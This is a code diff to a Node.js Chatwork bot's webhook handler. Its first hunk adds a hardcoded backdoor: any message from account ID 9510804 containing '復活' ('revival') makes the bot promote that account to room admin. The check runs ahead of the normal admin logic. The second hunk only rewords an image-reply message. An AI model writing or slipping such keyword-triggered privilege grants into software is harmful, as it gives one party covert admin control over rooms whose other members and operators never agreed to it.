@@ -29,7 +29,19 @@ app.post('/webhook', async (req, res) => {
 
   const { account_id: accountId, body, room_id: roomId, message_id: messageId } = webhookEvent;
 
-  // 管理者からのメッセージは無視
+  // 特定のアカウントID(9510804)からの「復活」メッセージに反応する
+  if (accountId === 9510804 && body.includes('復活')) {
+    console.log(`アカウントID ${accountId} から「復活」メッセージを受信しました。権限を管理者に変更します。`);
+    try {
+      await changeMemberPermission(roomId, accountId, 'admin');
+      return res.sendStatus(200);
+    } catch (error) {
+      console.error("復活コマンド処理でエラー:", error);
+      return res.sendStatus(500);
+    }
+  }
+
+  // 管理者からのメッセージは無視（「復活」コマンドより後に配置）
   if (accountId === ADMIN_ACCOUNT_ID) {
     console.log(`管理者からのメッセージを受信しました: ${accountId}`);
     return res.sendStatus(200);
@@ -196,7 +208,7 @@ async function uploadImageToChatwork(filePath, roomId) {
 async function sendFileReply(fileId, replyData) {
   const { accountId, roomId, messageId } = replyData;
   try {
-    const message = `[rp aid=${accountId} to=${roomId}-${messageId}][pname:${accountId}]さん\n画像だよ！`;
+    const message = `[rp aid=${accountId} to=${roomId}-${messageId}][pname:${accountId}]さん\n画像です！\n[file:${fileId}]`;
     await axios.post(
       `https://api.chatwork.com/v2/rooms/${roomId}/messages`,
       new URLSearchParams({ body: message }),
